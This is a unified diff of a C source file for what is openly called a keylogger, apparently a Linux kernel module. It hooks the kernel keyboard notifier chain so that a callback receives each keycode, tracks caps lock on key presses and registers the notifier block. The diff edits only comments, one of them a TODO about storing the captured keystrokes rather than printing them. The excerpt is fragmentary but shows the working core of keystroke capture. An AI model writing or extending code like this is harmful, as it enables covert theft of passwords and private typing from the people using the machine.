@@ -1,13 +1,8 @@
 #include "keylogger.h"
 
-
-//    The used method does not manipulate any kernel datastructures or smth else, we just use the legitimate
-//    kernel api.
-
-
 static int currently_capslock = 0;
 
-//Callback function, thats called when the notification chain emits a new event to its 'subscribers'.
+//Called when the notification chain emits a new event
 static int keyboard_event_callback(struct notifier_block *nb, unsigned long action, void *data)
 {
     if (!(action == KBD_KEYCODE)) return NOTIFY_OK;
@@ -18,7 +13,7 @@ static int keyboard_event_callback(struct notifier_block *nb, unsigned long acti
     if ((params->value > KEYCODE_LOOKUP_TABLE_SIZE) || (params->shift >= 3)) return NOTIFY_OK;
 
 
-    //TODO: change to persist keystrokes to file
+    //TODO: store information instead of printing it.
     if (params->down) {
 
         if (params->value == 0x3A) {
@@ -39,7 +34,6 @@ static int keyboard_event_callback(struct notifier_block *nb, unsigned long acti
 }
 
 
-//we could also add a priority so that we will be added at the front of the list ~> prob no benefit
 struct notifier_block np = {
     .notifier_call = keyboard_event_callback
 };
